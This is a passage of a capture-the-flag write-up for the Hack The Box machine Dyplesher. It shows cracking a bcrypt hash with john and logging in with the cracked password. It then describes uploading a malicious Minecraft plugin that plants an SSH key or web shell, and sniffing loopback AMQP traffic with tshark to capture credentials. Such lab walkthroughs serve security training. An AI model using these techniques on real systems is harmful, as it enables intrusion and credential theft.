19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now let&#x27;s see what&#x27;s in there:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ tree -S repos</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">repos</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    LICENSE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    README.md</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    src</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        VoteListener.py</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    banned-ips.json</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    banned-players.json</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    bukkit.yml</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    commands.yml</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    craftbukkit-1.8.jar</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    eula.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    help.yml</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ops.json</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    permissions.yml</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    plugins</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       LoginSecurity</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          authList</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          config.yml</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          users.db</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       LoginSecurity.jar</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       PluginMetrics</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           config.yml</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    python</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       pythonMqtt.py</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    README.md</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    sc-mqtt.jar</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    server.properties</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    spigot-1.8.jar</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    start.command</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    usercache.json</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    whitelist.json</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    world</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       data</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          villages.dat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          villages_end.dat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       level.dat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       level.dat_mcr</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       level.dat_old</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       playerdata</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          18fb40a5-c8d3-4f24-9bb8-a689914fcac3.dat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       region</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          r.0.0.mca</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          r.-1.0.mca</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       session.lock</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       uid.dat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    world_the_end</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        DIM1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           region</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">               r.0.0.mca</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">               r.0.-1.mca</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">               r.-1.0.mca</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">               r.-1.-1.mca</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        level.dat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        level.dat_old</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        session.lock</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        uid.dat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    LICENSE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    phpbash.min.php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    phpbash.php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    README.md</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     LICENSE.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     nightminer.py</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     README.md</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">16 directories, 50 files</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can see a file named <code>users.db</code>.</p><p>I&#x27;ll use dbeaver to browse the SQLite database.</p><p><img loading="lazy" src="https://i.imgur.com/1N6Cujz.png" class="img_ev3q"></p><p>There is only one user entry with the hash of a password
<code>$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6</code>.</p><p>Let&#x27;s crack this bcrypt hash like earleir with <a href="https://www.openwall.com/john/" target="_blank" rel="noopener noreferrer">john</a>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ john hashes.txt -w=/usr/share/wordlists/passwords/rockyou.txt --format=bcrypt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">alexis1          (x)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="http-enumeration-2">HTTP enumeration 2<a href="#http-enumeration-2" class="hash-link" aria-label="Direct link to HTTP enumeration 2" title="Direct link to HTTP enumeration 2">​</a></h2><p>Earlier we enumerated <a href="http://test.dyplesher.htb/" target="_blank" rel="noopener noreferrer">http://test.dyplesher.htb/</a> but not <a href="http://dyplesher.htb/" target="_blank" rel="noopener noreferrer">http://dyplesher.htb/</a>,
so let&#x27;s do it now:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ffuf -u http://dyplesher.htb/FUZZ -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -fc 403</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        /&#x27;___\  /&#x27;___\           /&#x27;___\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       /\ \__/ /\ \__/  __  __  /\ \__/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">         \ \_\   \ \_\  \ \____/  \ \_\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          \/_/    \/_/   \/___/    \/_/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       v1.2.0-git</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">________________________________________________</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Method           : GET</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: URL              : http://dyplesher.htb/FUZZ</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Follow redirects : false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Calibration      : false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Timeout          : 10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Threads          : 40</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Matcher          : Response status: 200,204,301,302,307,401,403</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Filter           : Response status: 403</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">________________________________________________</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">js                      [Status: 301, Size: 311, Words: 20, Lines: 10]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">register                [Status: 302, Size: 350, Words: 60, Lines: 12]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">css                     [Status: 301, Size: 312, Words: 20, Lines: 10]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">login                   [Status: 200, Size: 4188, Words: 1222, Lines: 84]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">img                     [Status: 301, Size: 312, Words: 20, Lines: 10]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">home                    [Status: 302, Size: 350, Words: 60, Lines: 12]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">staff                   [Status: 200, Size: 4389, Words: 1534, Lines: 103]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">:: Progress: [38267/38267] :: Job [1/1] :: 111 req/sec :: Duration: [0:07:11] :: Errors: 0 ::</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s go to the login page and try the password we just cracked.</p><p><a href="http://dyplesher.htb/login" target="_blank" rel="noopener noreferrer">http://dyplesher.htb/login</a></p><p><code>felamos@dyplesher.htb</code> / <code>alexis1</code></p><p><img loading="lazy" src="https://i.imgur.com/gNyKmYv.png" class="img_ev3q"></p><p>On the home page it&#x27;s talking about a Minecraft server and the backend allow to
upload and load &quot;plugins&quot; so I assume it&#x27;s Minecraft plugins.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="minecraft-plugin">Minecraft plugin<a href="#minecraft-plugin" class="hash-link" aria-label="Direct link to Minecraft plugin" title="Direct link to Minecraft plugin">​</a></h2><p>On the console page (<a href="http://dyplesher.htb/home/console" target="_blank" rel="noopener noreferrer">http://dyplesher.htb/home/console</a>) we can see
<code>Running Paper MC</code>. So this is a Paper MC server one of the many <a href="https://www.spigotmc.org/wiki/what-is-spigot-craftbukkit-bukkit-vanilla-forg/" target="_blank" rel="noopener noreferrer">minecraft forks</a>: <a href="https://papermc.io/" target="_blank" rel="noopener noreferrer">https://papermc.io/</a>.</p><p>We can also see that <a href="http://test.dyplesher.htb" target="_blank" rel="noopener noreferrer">http://test.dyplesher.htb</a> is deployed under
<code>/var/www/test/</code> and is owned by <code>MinatoTW</code>.</p><p>For the IDE where we&#x27;ll write the Minecraft plugin we can eitheir use
<a href="https://aur.archlinux.org/packages/eclipse-java/" target="_blank" rel="noopener noreferrer">Eclipse</a> or the more
recommended <a href="https://www.archlinux.org/packages/community/x86_64/intellij-idea-community-edition/" target="_blank" rel="noopener noreferrer">IntelliJ IDEA</a>.</p><p>Then use one of the methods below for <em>Creating a blank Spigot plugin</em>:</p><ul><li><a href="https://www.spigotmc.org/wiki/creating-a-blank-spigot-plugin-in-intellij-idea/" target="_blank" rel="noopener noreferrer">Creating a blank Spigot plugin in IntelliJ IDEA</a></li><li><a href="https://www.spigotmc.org/wiki/creating-a-plugin-with-maven-using-intellij-idea/" target="_blank" rel="noopener noreferrer">Creating a plugin with Maven using IntelliJ IDEA</a></li><li><a href="https://www.spigotmc.org/wiki/creating-a-blank-spigot-plugin-in-eclipse/" target="_blank" rel="noopener noreferrer">Creating a blank Spigot plugin in Eclipse</a></li><li><a href="https://www.spigotmc.org/wiki/creating-a-blank-spigot-plugin-in-netbeans/" target="_blank" rel="noopener noreferrer">Creating a blank Spigot plugin in NetBeans</a></li><li><a href="https://www.spigotmc.org/wiki/creating-a-blank-spigot-plugin-in-vs-code/" target="_blank" rel="noopener noreferrer">Creating a blank Spigot plugin in VS Code</a></li></ul><p>Then on the <code>onEnable()</code> method eitheir write your public key into
<code>/home/MinatoTW/.ssh/authorized_keys</code> or write a webshell where you will be
able to do the same thing.</p><p>When you have your JAR ready upload it (<a href="http://dyplesher.htb/home/add" target="_blank" rel="noopener noreferrer">http://dyplesher.htb/home/add</a>) and then
load it (<a href="http://dyplesher.htb/home/reload" target="_blank" rel="noopener noreferrer">http://dyplesher.htb/home/reload</a>).</p><p>Now connect via SSH to MinatoTW account with your key.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-of-machine--from-minatotw-to-felamos">Privilege Escalation of Machine : from MinatoTW to felamos<a href="#privilege-escalation-of-machine--from-minatotw-to-felamos" class="hash-link" aria-label="Direct link to Privilege Escalation of Machine : from MinatoTW to felamos" title="Direct link to Privilege Escalation of Machine : from MinatoTW to felamos">​</a></h2><p><code>user.txt</code> is not here so we must elevate to another user.</p><p>We can notice we are in an uncommon group: <a href="https://www.wireshark.org/" target="_blank" rel="noopener noreferrer">wireshark</a>.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">MinatoTW@dyplesher:~$ id</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uid=1001(MinatoTW) gid=1001(MinatoTW) groups=1001(MinatoTW),122(wireshark)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Of course as we don&#x27;t have a X environment we can&#x27;t launch it but we can
launch its CLI counterpart: tshark.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">MinatoTW@dyplesher:~$ which tshark</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/bin/tshark</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>But which traffic do we need to sniff?</p><p>AMQP (Advanced Message Queuing Protocol) listening on port 5672.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ss -nlpt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">State                   Recv-Q                  Send-Q                                     Local Address:Port                                      Peer Address:Port</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LISTEN                  0                       128                                              0.0.0.0:25672                                          0.0.0.0:*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LISTEN                  0                       128                                            127.0.0.1:3306                                           0.0.0.0:*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LISTEN                  0                       128                                            127.0.0.1:41717                                          0.0.0.0:*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LISTEN                  0                       128                                        127.0.0.53%lo:53                                             0.0.0.0:*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LISTEN                  0                       128                                              0.0.0.0:22                                             0.0.0.0:*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LISTEN                  0                       0                                                      *:25565                                                *:*                      users:((&quot;Cuberite&quot;,pid=1018,fd=23))</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LISTEN                  0                       70                                                     *:33060                                                *:*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LISTEN                  0                       128                                                    *:5672                                                 *:*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LISTEN                  0                       128                                                    *:11211                                                *:*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LISTEN                  0                       128                                                    *:80                                                   *:*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LISTEN                  0                       128                                                    *:4369                                                 *:*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LISTEN                  0                       128                                                 [::]:22                                                [::]:*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LISTEN                  0                       128                                                    *:3000                                                 *:*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LISTEN                  0                       128                                                    *:25562                                                *:*                      users:((&quot;java&quot;,pid=1017,fd=24))</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The loopback address is named lo:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ip link show</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    link/ether 00:50:56:b9:f6:b9 brd ff:ff:ff:ff:ff:ff</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    link/ether 02:42:93:96:cf:54 brd ff:ff:ff:ff:ff:ff</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">5: veth0da0d0f@if4: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP mode DEFAULT group default</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    link/ether 9a:1f:9b:50:bd:97 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now let&#x27;s capture loopback&#x27;s traffic:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ tshark -i lo -F pcap -w /tmp/cyfun.pcap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Capturing on &#x27;Loopback: lo&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1035</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We could retrieve the PCAP via SCP and open it in Wireshark but there is no fun
in that, so let&#x27;s try to read the PCAP with <code>tshark</code> directly.</p><p>For advanced amqp filters we can refer to <a href="https://www.wireshark.org/docs/dfref/a/amqp.html" target="_blank" rel="noopener noreferrer">wireshark doc</a>.</p><p>The content of amqp message is contained can be obtained with the filter
<code>amqp.payload</code> but will be displayed as hex.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ tshark -r /tmp/cyfun.pcap -Y &#x27;amqp&#x27; -T fields -e amqp.payload</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">7b226e616d65223a224a65737365204c616e67222c22656d61696c223a227363686f656e2e6d61657665406e69656e6f772e636f6d222c2261646472657373223a22343736204372697374696e612053747265616d205375697465203631335c6e46617272656c6c706f72742c204944203830313232</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">222c2270617373776f7264223a22555163336c3070594c424d69222c2273756273637269626564223a747275657d</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">7b226e616d65223a2248696c6c617264205072696365204956222c22656d61696c223a226c7374726f73696e407265796e6f6c64732e636f6d222c2261646472657373223a223330373131204b656e796174746120457374617465204170742e203831375c6e52697463686965737461642c204d4420</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3937383133222c2270617373776f7264223a22555163336c3070594c424d69222c2273756273637269626564223a747275657d</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">7b226e616d65223a224564756172646f204c65646e6572222c22656d61696c223a226b796c69652e73747265696368406b6f686c65722e62697a222c2261646472657373223a22353331363620526865612049736c616e645c6e4566666572747a6c616e642c20414c2031313836312d32363831222c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2270617373776f7264223a22555163336c3070594c424d69222c2273756273637269626564223a747275657d</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">7b226e616d65223a2244656e6973204b65656c696e67222c22656d61696c223a226b61696c6579333840676d61696c2e636f6d222c2261646472657373223a22393739363320576f6c66662049736c65204170742e203133335c6e536f7574682046616269616e2c20414c2031363138342d35373638</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">222c2270617373776f7264223a22555163336c3070594c424d69222c2273756273637269626564223a747275657d</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span 